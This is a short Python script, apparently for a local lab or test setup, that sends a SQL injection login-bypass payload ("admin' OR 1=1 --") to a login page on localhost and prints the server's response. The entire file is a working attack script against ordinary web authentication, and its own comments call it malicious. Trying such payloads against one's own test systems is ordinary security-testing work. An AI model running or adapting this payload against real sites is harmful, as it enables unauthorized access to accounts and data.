import requests

# Target Apache login page
url = "http://localhost:8080/login.php"

# Malicious SQL Injection Payload
payload = {
    "user": "admin' OR 1=1 --",
    "password": "password"
}

print("🚀 Attempting SQL Injection Attack...")

try:
    response = requests.get(url, params=payload)
    print(f"Response Code: {response.status_code}")
    print(f"Response Body:\n{response.text[:500]}")  # Print first 500 characters of response
except requests.exceptions.RequestException as e:
    print(f"❌ Request failed: {e}")
